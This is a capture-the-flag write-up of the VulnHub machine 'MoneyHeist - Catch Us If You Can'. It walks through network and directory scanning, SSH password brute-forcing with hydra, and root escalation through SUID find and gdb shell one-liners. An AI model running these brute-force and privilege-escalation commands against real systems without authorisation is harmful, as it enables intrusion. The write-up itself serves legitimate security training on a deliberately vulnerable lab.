---
title: MoneyHeist-Catch Us If You Can - Writeup
author: Elman Alizadeh
date: 2021-04-27 14:10:00 +0800
categories: [ctf, VulnHub]
tags: [vulnhub, moneyheist]
---

Today we will take a look at Vulnhub: Catch Us İf You Can. My goal in sharing this writeup is to show you the way if you are in trouble. Please try to understand each step and take notes.

![Desktop View]({{ "/assets/img/vuln-money/1.jpeg" | relative_url }})

## Network scan

 Command: sudo nmap -p- -sV -sC -oN nmap/open 192.168.0.110 — open

![Desktop View]({{ "/assets/img/vuln-money/2.png" | relative_url }})

## Gobuster scan

 Command: gobuster dir -u http://192.168.0.110/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

![Desktop View]({{ "/assets/img/vuln-money/3.png" | relative_url }})

When we look at the robots extension, we see the image tokyo.jpeg. but he was injured. Let’s download and fix.

![Desktop View]({{ "/assets/img/vuln-money/4.png" | relative_url }})

 Command: wget http://192.168.0.110/robots/tokyo.jpeg

You can find true titles here

[Link](https://en.wikipedia.org/wiki/List_of_file_signatures)

 Command: hexeditor tokyo.jpeg

![Desktop View]({{ "/assets/img/vuln-money/5.png" | relative_url }})

Let’s look at the corrected image.

![Desktop View]({{ "/assets/img/vuln-money/6.png" | relative_url }})

This is a trap.

Let’s look at the gate extension

![Desktop View]({{ "/assets/img/vuln-money/7.png" | relative_url }})

![Desktop View]({{ "/assets/img/vuln-money/8.png" | relative_url }})

we see the gate.exe file. let’s download and see

![Desktop View]({{ "/assets/img/vuln-money/9.png" | relative_url }})

Here’s a new extension.

![Desktop View]({{ "/assets/img/vuln-money/10.png" | relative_url }})

When we look at the page, we see a simple page. let’s check the bride extension

 Command: gobuster dir -u http://192.168.0.110/BankOfSp41n -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt

![Desktop View]({{ "/assets/img/vuln-money/11.png" | relative_url }})

When you go to login.php, it is a simple login page. Let’s check a few simple default credentials

![Desktop View]({{ "/assets/img/vuln-money/12.png" | relative_url }})

Let’s look at the source code

![Desktop View]({{ "/assets/img/vuln-money/13.png" | relative_url }})

![Desktop View]({{ "/assets/img/vuln-money/14.png" | relative_url }})

And here we find the username and the password, let’s enter.

![Desktop View]({{ "/assets/img/vuln-money/15.png" | relative_url }})

When I looked at the page, I couldn’t find anything to use

I looked at the source code at the end and saw a username here

![Desktop View]({{ "/assets/img/vuln-money/16.png" | relative_url }})

Let’s try to log in with ssh with this name. But first let’s find the password

## Hydra

Command: hydra -l arturo -P /usr/share/wordlists/rockyou.txt ssh://192.168.0.110:55001 -I -t 4

![Desktop View]({{ "/assets/img/vuln-money/17.png" | relative_url }})

## Ssh

![Desktop View]({{ "/assets/img/vuln-money/18.png" | relative_url }})

Command: find / -type f -perm -04000 -ls 2>/dev/null

![Desktop View]({{ "/assets/img/vuln-money/19.png" | relative_url }})

Let’s change the user. We will use it for this

[Gfto](https://gtfobins.github.io/)

Command: find . -exec /bin/sh -p \; -quit

![Desktop View]({{ "/assets/img/vuln-money/20.png" | relative_url }})

Yes we are now denver.

![Desktop View]({{ "/assets/img/vuln-money/1.gif" | relative_url }})

Let’s look at the secret_diary of the Denver folder and get a new extension. let’s check it

![Desktop View]({{ "/assets/img/vuln-money/21.png" | relative_url }})

Let’s use it to decode

[Cryptii](https://cryptii.com/)

![Desktop View]({{ "/assets/img/vuln-money/22.png" | relative_url }})

Find the encrypted text by making different decodings

![Desktop View]({{ "/assets/img/vuln-money/23.png" | relative_url }})

## Nairobi

Command: su nairobi

![Desktop View]({{ "/assets/img/vuln-money/24.png" | relative_url }})

![Desktop View]({{ "/assets/img/vuln-money/2.gif" | relative_url }})

## Tokyo

Command: find / -type f -perm -04000 -ls 2>/dev/null

![Desktop View]({{ "/assets/img/vuln-money/25.png" | relative_url }})

Command: gdb -nx -ex ‘python import os; os.execl(“/bin/sh”, “sh”, “-p”)’ -ex quit

![Desktop View]({{ "/assets/img/vuln-money/26.png" | relative_url }})

![Desktop View]({{ "/assets/img/vuln-money/3.gif" | relative_url }})

I looked in Tokyo’s folder and saw an text like this.

![Desktop View]({{ "/assets/img/vuln-money/27.png" | relative_url }})

## Root 

If we combine the capital letters of the words, we get the root password.

![Desktop View]({{ "/assets/img/vuln-money/28.png" | relative_url }})

# And now we are the root

![Desktop View]({{ "/assets/img/vuln-money/4.gif" | relative_url }})

“If you have any questions or comments, please do not hesitate to write. Have a good days”

























